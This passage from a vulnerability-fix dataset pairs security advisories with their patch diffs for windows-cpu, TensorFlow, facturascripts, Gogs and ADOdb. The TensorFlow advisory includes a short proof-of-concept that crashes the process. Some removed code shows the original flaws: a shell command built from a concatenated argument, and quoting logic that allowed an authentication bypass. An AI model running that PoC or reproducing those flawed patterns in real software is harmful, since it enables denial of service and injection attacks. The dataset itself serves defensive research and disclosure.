Win32_PerfFormattedData_PerfProc_Process get Name,PercentProcessorTime,IDProcess | findstr \/i \/c:\" + arg;\\n-        exec(cmd, function (error, res, stderr) {\\n-            if(error !== null || stderr) return cb(error || stderr);\\n-            if(!res) return cb(\\'Cannot find results for provided arg: \\' + arg, { load: 0, results: [] });\\n-            \\n-            var found = res.replace(\/[^\\\\S\\\\n]+\/g, \\':\\').replace(\/\\\\:\\\\s\/g, \\'|\\').split(\\'|\\').filter(function(v) {\\n-                return !!v;\\n-            }).map(function(v) {\\n-                var data = v.split(\\':\\');\\n-                return {\\n-                    pid: +data[0],\\n-                    process: data[1],\\n-                    load: +data[2]\\n-                };\\n-            });\\n-            \\n-            var totalLoad = 0;\\n-            \\n-            found.forEach(function(obj) {\\n-                totalLoad += obj.load;\\n-            });\\n-            \\n-            var output = {\\n-                load: totalLoad,\\n-                found: found\\n-            };\\n-            \\n-            cb(null, output);\\n-        });\\n-    };\\n+        try {\\n+            fs.accessSync(wmic);\\n+        } catch(e) {\\n+            throw new Error(\\'windows-cpu is not supported on your version of Windows or you are not running as administrator.\\');\\n+        }\\n+        \\n+        return true;\\n+    }\\n     \\n     \/**\\n      * Gets the total load in percent for all processes running on the current machine per CPU.\\n-     * @param {function} cb A callback function to handle the results (error, results).\\n+     * @param  {Function} cb Callback to call with results (error, results)\\n+     * @return {WindowsCPU}  Instance of the WindowsCPU class\\n      * @example\\n      *\\n-     * var cpu = require(\\'windows-cpu\\');\\n+     * const cpu = require(\\'windows-cpu\\');\\n      *\\n      * \/\/ Get total load on server for each CPU\\n      * cpu.totalLoad(function(error, results) {\\n@@ -129,27 +101,27 @@\\n      *      \/\/ [3, 10]\\n      * });\\n      *\/\\n-    exports.totalLoad = function totalLoad(cb) {\\n-        if (!isFunction(cb)) cb = emptyFn;\\n-        if (!checkPlatform(cb)) return;\\n-        \\n-        execFile(wmic, [\\'cpu\\', \\'get\\', \\'loadpercentage\\'], function (error, res, stderr) {\\n+    totalLoad(cb) {\\n+        execFile(wmic, [\\'cpu\\', \\'get\\', \\'loadpercentage\\'], function(error, res, stderr) {\\n             if(error !== null || stderr) return cb(error || stderr);\\n             \\n-            var cpus = (res.match(\/\\\\d+\/g) || []).map(function(x) { \\n+            let cpus = (res.match(\/\\\\d+\/g) || []).map(function(x) { \\n                 return +(x.trim()); \\n             });\\n             \\n             cb(null, cpus);\\n         });\\n-    };\\n+        \\n+        return this;\\n+    }\\n     \\n     \/**\\n-     * Gets the total load in percent for all Node.js processes running on the current machine.\\n-     * @param {function} cb A callback function to handle the results (error, results).\\n+     * Retrieves the current cpu load for all node processes running on the current machine\\n+     * @param  {Function} cb Callback to call with results (error, results)\\n+     * @return {WindowsCPU}  Instance of the WindowsCPU class\\n      * @example\\n      *\\n-     * var cpu = require(\\'windows-cpu\\');\\n+     * const cpu = require(\\'windows-cpu\\');\\n      *\\n      * \/\/ Get total load for all node processes\\n      * cpu.nodeLoad(function(error, results) {\\n@@ -167,19 +139,21 @@\\n      *      \/\/    ]\\n      *      \/\/ }\\n      *\\n-     *      console.log(\\'Total Node.js Load: \\' + results.load);\\n+     *      console.log(`Total Node.js Load: ${results.load}%`);\\n      * });\\n      *\/\\n-    exports.nodeLoad = function nodeLoad(cb) {\\n+    nodeLoad(cb) {\\n         findLoad(\\'node\\', cb);\\n-    };\\n+        return this;\\n+    }\\n     \\n     \/**\\n-     * Gets the total load in percent for all processes running on the current machine per CPU.\\n-     * @param {function} cb A callback function to handle the results (error, results).\\n+     * Retrieves the current cpu load for this process.\\n+     * @param  {Function} cb Callback to call with results (error, results)\\n+     * @return {WindowsCPU}  Instance of the WindowsCPU class\\n      * @example\\n      *\\n-     * var cpu = require(\\'windows-cpu\\');\\n+     * const cpu = require(\\'windows-cpu\\');\\n      *\\n      * \/\/ Get load for current running node process\\n      * cpu.processLoad(function(error, results) {\\n@@ -195,19 +169,21 @@\\n      *      \/\/    ]\\n      *      \/\/ }\\n      *\\n-     *      console.log(\\'Total Process Load: \\' + results.load);\\n+     *      console.log(`Total Process Load: ${results.load}%`);\\n      * });\\n      *\/\\n-    exports.processLoad = function processLoad(cb) {\\n+    processLoad(cb) {\\n         findLoad(process.pid, cb);\\n-    };\\n+        return this;\\n+    }\\n     \\n     \/**\\n-     * Gets the name of each processor in the machine.\\n-     * @param {function} cb A callback function to handle the results (error, results).\\n+     * Gets list of all processors in the current machine.\\n+     * @param  {Function} cb Callback to call with results (error, results)\\n+     * @return {WindowsCPU}  Instance of the WindowsCPU class\\n      * @example\\n      *\\n-     * var cpu = require(\\'windows-cpu\\');\\n+     * const cpu = require(\\'windows-cpu\\');\\n      *\\n      * \/\/ Get listing of processors\\n      * cpu.cpuInfo(function(error, results) {\\n@@ -224,28 +200,28 @@\\n      *      console.log(\\'Installed Processors: \\', results);\\n      * });\\n      *\/\\n-    exports.cpuInfo = function cpuInfo(cb) {\\n-        if(!isFunction(cb)) cb = emptyFn;\\n-        if(!checkPlatform(cb)) return;\\n-        \\n-        execFile(wmic, [\\'cpu\\', \\'get\\', \\'Name\\'], function (error, res, stderr) {\\n+    cpuInfo(cb) {\\n+        execFile(wmic, [\\'cpu\\', \\'get\\', \\'Name\\'], function(error, res, stderr) {\\n             if(error !== null || stderr) return cb(error || stderr);\\n             \\n-            var cpus = res.match(\/[^\\\\r\\\\n]+\/g).map(function(v) {\\n+            let cpus = res.match(\/[^\\\\r\\\\n]+\/g).map(function(v) {\\n                 return v.trim();\\n             });\\n             \\n             cpus.shift();\\n             cb(null, cpus);\\n         });\\n-    };\\n-\\n+        \\n+        return this;\\n+    }\\n+    \\n     \/**\\n-     * Gets the total memory usage value in KB , MB and GB .\\n-     * @param {function} cb A callback function to handle the result (error, results).\\n+     * Gets the total memory usage on the machine in KB, MB and GB.\\n+     * @param  {Function} cb Callback to call with results (error, results)\\n+     * @return {WindowsCPU}  Instance of the WindowsCPU class\\n      * @example\\n      *\\n-     * var cpu = require(\\'windows-cpu\\');\\n+     * const cpu = require(\\'windows-cpu\\');\\n      *\\n      * \/\/ Get the memory usage\\n      * cpu.totalMemoryUsage(function(error, results) {\\n@@ -263,17 +239,14 @@\\n      *      console.log(\\'Total Memory Usage: \\', result);\\n      * });\\n      *\/\\n-    exports.totalMemoryUsage = function totalMemoryUsage(cb) {\\n-        if (!isFunction(cb)) cb = emptyFn;\\n-        if (!checkPlatform(cb)) return;\\n-        \\n-        var cmd = \"tasklist \/FO csv \/nh\";\\n-        exec(cmd, function (error, res, stderr) {\\n+    totalMemoryUsage(cb) {\\n+        let cmd = \\'tasklist \/FO csv \/nh\\';\\n+        exec(cmd, function(error, res, stderr) {\\n             if(error !== null || stderr) return cb(error || stderr);\\n-            var results = { usageInKb: 0 , usageInMb: 0 , usageInGb: 0 };\\n+            let results = { usageInKb: 0 , usageInMb: 0 , usageInGb: 0 };\\n             \\n             results.usageInKb = res.match(\/[^\\\\r\\\\n]+\/g).map(function(v) {\\n-                var amt = +v.split(\\'\",\"\\')[4].replace(\/[^\\\\d]\/g, \\'\\');\\n+                let amt = +v.split(\\'\",\"\\')[4].replace(\/[^\\\\d]\/g, \\'\\');\\n                 return (!isNaN(amt) && typeof amt === \\'number\\')? amt : 0;\\n             }).reduce(function(prev, current) {\\n                 return prev + current;\\n@@ -284,5 +257,9 @@\\n             \\n             cb(null, results);\\n         });\\n-    };\\n-}());\\n+        \\n+        return this;\\n+    }\\n+}\\n+\\n+module.exports = new WindowsCPU();'}}","message_norm":"es6 refactor + fix vulnerability","language":"ca","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":742,"vuln_id":"GHSA-6445-fm66-fvq2","cwe_id":"{'CWE-190'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b51b82fe65ebace4475e3c54eb089c18a4403f1c', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a68f68061e263a88321c104a6c911fe5598050a8'}","dataset":"osv","summary":"Integer overflows in Tensorflow ### Impact \nThe [implementation of `AddManySparseToTensorsMap`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc) is vulnerable to an integer overflow which results in a `CHECK`-fail when building new `TensorShape` objects (so, an assert failure based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.AddManySparseToTensorsMap(\n    sparse_indices=[(0,0),(0,1),(0,2),(4,3),(5,0),(5,1)],\n    sparse_values=[1,1,1,1,1,1],\n    sparse_shape=[2**32,2**32],\n    container='',\n    shared_name='',\n    name=None)\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n### Patches\nWe have patched the issue in GitHub commits [b51b82fe65ebace4475e3c54eb089c18a4403f1c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b51b82fe65ebace4475e3c54eb089c18a4403f1c) and [a68f68061e263a88321c104a6c911fe5598050a8](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a68f68061e263a88321c104a6c911fe5598050a8).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b51b82fe65ebace4475e3c54eb089c18a4403f1c","commit_sha":"b51b82fe65ebace4475e3c54eb089c18a4403f1c","patch":"MULTI","chain_ord":"['b51b82fe65ebace4475e3c54eb089c18a4403f1c', 'a68f68061e263a88321c104a6c911fe5598050a8']","before_first_fix_commit":"{'e8f4be7958736823b9f56090611ec2fb09824d51'}","last_fix_commit":"a68f68061e263a88321c104a6c911fe5598050a8","chain_ord_pos":1.0,"commit_datetime":"12\/09\/2021, 22:32:48","message":"Add missing validation to `AddManySparseToTensorsMap`.\n\nSparse tensors have a set of requirements for the 3 components and not all of them were checked.\n\nPiperOrigin-RevId: 415358027\nChange-Id: I96cbb672999cd1da772c22fabbd15507e32e12dc","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 15, 'deletions': 2, 'total': 17}","files":"{'tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc': {'additions': 15, 'deletions': 2, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b51b82fe65ebace4475e3c54eb089c18a4403f1c\/tensorflow%2Fcore%2Fkernels%2Fsparse_tensors_map_ops.cc', 'patch': '@@ -231,16 +231,29 @@ class AddManySparseToTensorsMapOp : public SparseTensorAccessingOp {\\n                 errors::InvalidArgument(\\n                     \"Input indices should be a matrix but received shape \",\\n                     input_indices->shape().DebugString()));\\n-\\n     OP_REQUIRES(context, TensorShapeUtils::IsVector(input_values->shape()),\\n                 errors::InvalidArgument(\\n                     \"Input values should be a vector but received shape \",\\n                     input_values->shape().DebugString()));\\n-\\n     OP_REQUIRES(context, TensorShapeUtils::IsVector(input_shape->shape()),\\n                 errors::InvalidArgument(\\n                     \"Input shape should be a vector but received shape \",\\n                     input_shape->shape().DebugString()));\\n+    OP_REQUIRES(\\n+        context,\\n+        input_values->shape().dim_size(0) == input_indices->shape().dim_size(0),\\n+        errors::InvalidArgument(\\n+            \"Number of values must match first dimension of indices. \", \"Got \",\\n+            input_values->shape().dim_size(0),\\n+            \" values, indices shape: \", input_indices->shape().DebugString()));\\n+    OP_REQUIRES(\\n+        context,\\n+        input_shape->shape().dim_size(0) == input_indices->shape().dim_size(1),\\n+        errors::InvalidArgument(\\n+            \"Number of dimensions must match second dimension of indices. \",\\n+            \"Got \", input_shape->shape().dim_size(0),\\n+            \" dimensions, indices shape: \",\\n+            input_indices->shape().DebugString()));\\n \\n     int rank = input_shape->NumElements();'}}","message_norm":"add missing validation to `addmanysparsetotensorsmap`.\n\nsparse tensors have a set of requirements for the 3 components and not all of them were checked.\n\npiperorigin-revid: 415358027\nchange-id: i96cbb672999cd1da772c22fabbd15507e32e12dc","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('415358027', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc'])","num_files":1.0},{"index":743,"vuln_id":"GHSA-6445-fm66-fvq2","cwe_id":"{'CWE-190'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b51b82fe65ebace4475e3c54eb089c18a4403f1c', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a68f68061e263a88321c104a6c911fe5598050a8'}","dataset":"osv","summary":"Integer overflows in Tensorflow ### Impact \nThe [implementation of `AddManySparseToTensorsMap`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc) is vulnerable to an integer overflow which results in a `CHECK`-fail when building new `TensorShape` objects (so, an assert failure based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.AddManySparseToTensorsMap(\n    sparse_indices=[(0,0),(0,1),(0,2),(4,3),(5,0),(5,1)],\n    sparse_values=[1,1,1,1,1,1],\n    sparse_shape=[2**32,2**32],\n    container='',\n    shared_name='',\n    name=None)\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n### Patches\nWe have patched the issue in GitHub commits [b51b82fe65ebace4475e3c54eb089c18a4403f1c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b51b82fe65ebace4475e3c54eb089c18a4403f1c) and [a68f68061e263a88321c104a6c911fe5598050a8](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a68f68061e263a88321c104a6c911fe5598050a8).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a68f68061e263a88321c104a6c911fe5598050a8","commit_sha":"a68f68061e263a88321c104a6c911fe5598050a8","patch":"MULTI","chain_ord":"['b51b82fe65ebace4475e3c54eb089c18a4403f1c', 'a68f68061e263a88321c104a6c911fe5598050a8']","before_first_fix_commit":"{'e8f4be7958736823b9f56090611ec2fb09824d51'}","last_fix_commit":"a68f68061e263a88321c104a6c911fe5598050a8","chain_ord_pos":2.0,"commit_datetime":"12\/10\/2021, 00:17:26","message":"Replace faulty overflow check with a builder for `TensorShape`.\n\nPrevents an integer overflow that was not caught before.\n\nPiperOrigin-RevId: 415381595\nChange-Id: I76585ddedc912bd9f4a390aeafa8e2ced1a28863","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 15, 'total': 18}","files":"{'tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc': {'additions': 3, 'deletions': 15, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a68f68061e263a88321c104a6c911fe5598050a8\/tensorflow%2Fcore%2Fkernels%2Fsparse_tensors_map_ops.cc', 'patch': '@@ -263,22 +263,10 @@ class AddManySparseToTensorsMapOp : public SparseTensorAccessingOp {\\n             \"Rank of input SparseTensor should be > 1, but saw rank: \", rank));\\n \\n     auto input_shape_vec = input_shape->vec<int64_t>();\\n-    int new_num_elements = 1;\\n-    bool overflow_ocurred = false;\\n-    for (int i = 0; i < input_shape_vec.size(); i++) {\\n-      new_num_elements =\\n-          MultiplyWithoutOverflow(new_num_elements, input_shape_vec(i));\\n-      if (new_num_elements < 0) {\\n-        overflow_ocurred = true;\\n-        break;\\n-      }\\n-    }\\n-\\n-    OP_REQUIRES(\\n-        context, !overflow_ocurred,\\n-        errors::Internal(\"Encountered overflow from large input shape.\"));\\n \\n-    TensorShape tensor_input_shape(input_shape_vec);\\n+    TensorShape tensor_input_shape;\\n+    OP_REQUIRES_OK(context, TensorShape::BuildTensorShape(input_shape_vec,\\n+                                                          &tensor_input_shape));\\n     gtl::InlinedVector<int64_t, 8> std_order(rank);\\n     std::iota(std_order.begin(), std_order.end(), 0);\\n     SparseTensor input_st;'}}","message_norm":"replace faulty overflow check with a builder for `tensorshape`.\n\nprevents an integer overflow that was not caught before.\n\npiperorigin-revid: 415381595\nchange-id: i76585ddedc912bd9f4a390aeafa8e2ced1a28863","language":"en","entities":"[('overflow', 'SECWORD', ''), ('prevents', 'ACTION', ''), ('integer overflow', 'SECWORD', ''), ('415381595', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_tensors_map_ops.cc'])","num_files":1.0},{"index":744,"vuln_id":"GHSA-6465-r752-2h8v","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/neorazorx\/facturascripts\/commit\/8e31d8434014a6d1e8791a489d84268fd74b0c9a'}","dataset":"osv","summary":"Cross-site Scripting in facturascripts Reflected cross-site scripting using url based payload in GitHub repository neorazorx\/facturascripts prior to 2022.08. This can lead to theft of a user's cookies, which in turn could lead to account takeover or do other malicious activities in a victim's browser.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/neorazorx\/facturascripts","commit_href":"https:\/\/github.com\/neorazorx\/facturascripts\/commit\/8e31d8434014a6d1e8791a489d84268fd74b0c9a","commit_sha":"8e31d8434014a6d1e8791a489d84268fd74b0c9a","patch":"SINGLE","chain_ord":"['8e31d8434014a6d1e8791a489d84268fd74b0c9a']","before_first_fix_commit":"{'ec88bc72ff2f6eb79a27112c777a7d601e946ed5'}","last_fix_commit":"8e31d8434014a6d1e8791a489d84268fd74b0c9a","chain_ord_pos":1.0,"commit_datetime":"05\/09\/2022, 22:12:41","message":"We check the url parameter of the link to ensure that it is a valid controller.\n------\nComprobamos el par\u00e1metro url del enlace para asegurar que sea un controlador v\u00e1lido.","author":"Carlos Garcia Gomez","comments":null,"stats":"{'additions': 18, 'deletions': 1, 'total': 19}","files":"{'Core\/Controller\/EditPageOption.php': {'additions': 18, 'deletions': 1, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NeoRazorX\/facturascripts\/raw\/8e31d8434014a6d1e8791a489d84268fd74b0c9a\/Core%2FController%2FEditPageOption.php', 'patch': \"@@ -24,6 +24,7 @@\\n use FacturaScripts\\\\Core\\\\Base\\\\DataBase\\\\DataBaseWhere;\\n use FacturaScripts\\\\Core\\\\Lib\\\\Widget\\\\VisualItemLoadEngine;\\n use FacturaScripts\\\\Dinamic\\\\Model\\\\CodeModel;\\n+use FacturaScripts\\\\Dinamic\\\\Model\\\\Page;\\n use FacturaScripts\\\\Dinamic\\\\Model\\\\PageOption;\\n use FacturaScripts\\\\Dinamic\\\\Model\\\\User;\\n use Symfony\\\\Component\\\\HttpFoundation\\\\Response;\\n@@ -121,7 +122,7 @@ public function privateCore(&$response, $user, $permissions)\\n         parent::privateCore($response, $user, $permissions);\\n         $this->model = new PageOption();\\n         $this->loadSelectedViewName();\\n-        $this->backPage = $this->request->get('url') ?: $this->selectedViewName;\\n+        $this->setBackPage();\\n         $this->selectedUser = $this->user->admin ? $this->request->get('nick') : $this->user->nick;\\n         $this->loadPageOptions();\\n \\n@@ -275,6 +276,22 @@ private function loadPageOptionsForUser(): bool\\n         return true;\\n     }\\n \\n+    private function setBackPage()\\n+    {\\n+        \/\/ check if the url is a real controller name\\n+        $url = $this->request->get('url', '');\\n+        $pageModel = new Page();\\n+        foreach ($pageModel->all([], [], 0, 0) as $page) {\\n+            if (substr($url, 0, strlen($page->name)) === $page->name) {\\n+                $this->backPage = $url;\\n+                return;\\n+            }\\n+        }\\n+\\n+        \/\/ set the default back page\\n+        $this->backPage = $this->selectedViewName;\\n+    }\\n+\\n     \/**\\n      * @param array $column\\n      * @param string $name\"}}","message_norm":"we check the url parameter of the link to ensure that it is a valid controller.\n------\ncomprobamos el par\u00e1metro url del enlace para asegurar que sea un controlador v\u00e1lido.","language":"es","entities":"[('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Core\/Controller\/EditPageOption.php'])","num_files":1.0},{"index":754,"vuln_id":"GHSA-65f3-3278-7m65","cwe_id":"{'CWE-285', 'CWE-863'}","score":8.2,"chain":"{'https:\/\/github.com\/gogs\/gogs\/commit\/64102be2c90e1b47dbdd379873ba76c80d4b0e78'}","dataset":"osv","summary":"Improper Authorization in Gogs ### Impact\n\nExpired PAM accounts and accounts with expired passwords are continued to be seen as valid. Installations use PAM as authentication sources are affected.\n\n### Patches\n\nExpired PAM accounts and accounts with expired passwords are no longer being seen as valid. Users should upgrade to 0.12.5 or the latest 0.13.0+dev.\n\n### Workarounds\n\nIn addition to marking PAM accounts as expired, also disable\/lock them. Running `usermod -L <username>` will add an exclamation mark to the password hash and would result in wrong passwords responses when trying to login. \n\n### References\n\nhttps:\/\/huntr.dev\/bounties\/ea82cfc9-b55c-41fe-ae58-0d0e0bd7ab62\/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https:\/\/github.com\/gogs\/gogs\/issues\/6810.","published_date":"2022-03-12","chain_len":1,"project":"https:\/\/github.com\/gogs\/gogs","commit_href":"https:\/\/github.com\/gogs\/gogs\/commit\/64102be2c90e1b47dbdd379873ba76c80d4b0e78","commit_sha":"64102be2c90e1b47dbdd379873ba76c80d4b0e78","patch":"SINGLE","chain_ord":"['64102be2c90e1b47dbdd379873ba76c80d4b0e78']","before_first_fix_commit":"{'91f2cde5e95f146bfe4765e837e7282df6c7cabb'}","last_fix_commit":"64102be2c90e1b47dbdd379873ba76c80d4b0e78","chain_ord_pos":1.0,"commit_datetime":"03\/08\/2022, 12:02:01","message":"security: fix improper PAM authorization handling (#6819)\n\nCo-authored-by: Joe Chen <jc@unknwon.io>\n# Conflicts:\n#\tCHANGELOG.md\n#\tinternal\/auth\/pam\/pam.go","author":"ysf","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'internal\/auth\/pam\/pam.go': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gogs\/gogs\/raw\/64102be2c90e1b47dbdd379873ba76c80d4b0e78\/internal%2Fauth%2Fpam%2Fpam.go', 'patch': '@@ -27,9 +27,9 @@ func PAMAuth(serviceName, userName, passwd string) error {\\n \\t\\treturn err\\n \\t}\\n \\n-\\tif err = t.Authenticate(0); err != nil {\\n+\\terr = t.Authenticate(0)\\n+\\tif err != nil {\\n \\t\\treturn err\\n \\t}\\n-\\n-\\treturn nil\\n+\\treturn t.AcctMgmt(0)\\n }'}}","message_norm":"security: fix improper pam authorization handling (#6819)\n\nco-authored-by: joe chen <jc@unknwon.io>\n# conflicts:\n#\tchangelog.md\n#\tinternal\/auth\/pam\/pam.go","language":"en","entities":"[('security', 'SECWORD', ''), ('fix', 'ACTION', ''), ('#6819', 'ISSUE', ''), ('jc@unknwon.io', 'EMAIL', ''), ('auth', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['internal\/auth\/pam\/pam.go'])","num_files":1.0},{"index":755,"vuln_id":"GHSA-65mj-7c86-79jf","cwe_id":"{'CWE-305', 'CWE-287'}","score":9.1,"chain":"{'https:\/\/github.com\/ADOdb\/ADOdb\/commit\/952de6c4273d9b1e91c2b838044f8c2111150c29', 'https:\/\/github.com\/ADOdb\/ADOdb\/commit\/b4d5ce70034c5aac3a1d51d317d93c037a0938d2'}","dataset":"osv","summary":"Authentication Bypass in ADOdb\/ADOdb ### Impact\n\nAn attacker can inject values into a PostgreSQL connection string by providing a parameter surrounded by single quotes.\n\nDepending on how the library is used in the client software, this may allow an attacker to bypass the login process, gain access to the server's IP address, etc.\n\n### Patches\n\nThe vulnerability is fixed in ADOdb versions 5.20.21 (952de6c4273d9b1e91c2b838044f8c2111150c29) and 5.21.4 or later (b4d5ce70034c5aac3a1d51d317d93c037a0938d2).\n\nThe simplest patch is to delete line 29 in `drivers\/adodb-postgres64.inc.php`:\n\n```php\ndiff --git a\/drivers\/adodb-postgres64.inc.php b\/drivers\/adodb-postgres64.inc.php\nindex d04b7f67..729d7141 100644\n--- a\/drivers\/adodb-postgres64.inc.php\n+++ b\/drivers\/adodb-postgres64.inc.php\n@@ -26,7 +26,6 @@ function adodb_addslashes($s)\n {\n    $len = strlen($s);\n    if ($len == 0) return \"''\";\n-   if (strncmp($s,\"'\",1) === 0 && substr($s,$len-1) == \"'\") return $s; \/\/ already quoted\n \n    return \"'\".addslashes($s).\"'\";\n }\n```\n\n### Workarounds\n\nEnsure the parameters passed to *ADOConnection::connect()* or related functions (_nConnect()_, _pConnect()_) are not surrounded by single quotes.\n\n### Credits\n\nThanks to **Emmet Leahy** (@meme-lord) of Sorcery Ltd for reporting this vulnerability, and to the [huntr](https:\/\/huntr.dev\/) team for their support.\n\n### References\n\n- Original issue report https:\/\/huntr.dev\/bounties\/bdf5f216-4499-4225-a737-b28bc6f5801c\/\n- ADOdb reference issue #793 \n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Add a note in issue #793\n* Contact the maintainers on [Gitter](https:\/\/gitter.im\/adodb\/adodb)","published_date":"2022-01-27","chain_len":2,"project":"https:\/\/github.com\/ADOdb\/ADOdb","commit_href":"https:\/\/github.com\/ADOdb\/ADOdb\/commit\/952de6c4273d9b1e91c2b838044f8c2111150c29","commit_sha":"952de6c4273d9b1e91c2b838044f8c2111150c29","patch":"MULTI","chain_ord":"['952de6c4273d9b1e91c2b838044f8c2111150c29', 'b4d5ce70034c5aac3a1d51d317d93c037a0938d2']","before_first_fix_commit":"{'c5415722049f36c446a4034d15f1d17943f11458'}","last_fix_commit":"b4d5ce70034c5aac3a1d51d317d93c037a0938d2","chain_ord_pos":1.0,"commit_datetime":"01\/10\/2022, 08:41:32","message":"Prevent auth bypass with PostgreSQL connections\n\nThanks to Emmet Leahy of Sorcery Ltd for reporting this vulnerability\n(CVE-2021-3850).\n\nThis is a minimalistic approach to patch the issue, to reduce the risk\nof causing regressions in the legacy stable branch.\n\nFixes #793","author":"Damien Regad","comments":null,"stats":"{'additions': 0, 'deletions': 1, 'total': 1}","files":"{'drivers\/adodb-postgres64.inc.php': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ADOdb\/ADOdb\/raw\/952de6c4273d9b1e91c2b838044f8c2111150c29\/drivers%2Fadodb-postgres64.inc.php', 'patch': '@@ -51,7 +51,6 @@ function adodb_addslashes($s)\\n {\\n \\t$len = strlen($s);\\n \\tif ($len == 0) return \"\\'\\'\";\\n-\\tif (strncmp($s,\"\\'\",1) === 0 && substr($s,$len-1) == \"\\'\") return $s; \/\/ already quoted\\n \\n \\treturn \"\\'\".addslashes($s).\"\\'\";\\n }'}}","message_norm":"prevent auth bypass with postgresql connections\n\nthanks to emmet leahy of sorcery ltd for reporting this vulnerability\n(cve-2021-3850).\n\nthis is a minimalistic approach to patch the issue, to reduce the risk\nof causing regressions in the legacy stable branch.\n\nfixes #793","language":"en","entities":"[('prevent', 'ACTION', ''), ('auth', 'SECWORD', ''), ('bypass', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('cve-2021-3850', 'VULNID', 'CVE'), ('patch', 'ACTION', ''), ('issue', 'FLAW', ''), ('fixes', 'ACTION', ''), ('#793', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['drivers\/adodb-postgres64.inc.php'])","num_files":1.0},{"index":756,"vuln_id":"GHSA-65mj-7c86-79jf","cwe_id":"{'CWE-305', 'CWE-287'}","score":9.1,"chain":"{'https:\/\/github.com\/ADOdb\/ADOdb\/commit\/952de6c4273d9b1e91c2b838044f8c2111150c29', 'https:\/\/github.com\/ADOdb\/ADOdb\/commit\/b4d5ce70034c5aac3a1d51d317d93c037a0938d2'}","dataset":"osv","summary":"Authentication Bypass in ADOdb\/ADOdb ### Impact\n\nAn attacker can inject values into a PostgreSQL connection string by providing a parameter surrounded by single quotes.\n\nDepending on how the library is used in the client software, this may allow an attacker to bypass the login process, gain access to the server's IP address, etc.\n\n### Patches\n\nThe vulnerability is fixed in ADOdb versions 5.20.21 (952de6c4273d9b1e91c2b838044f8c2111150c29) and 5.21.4 or later 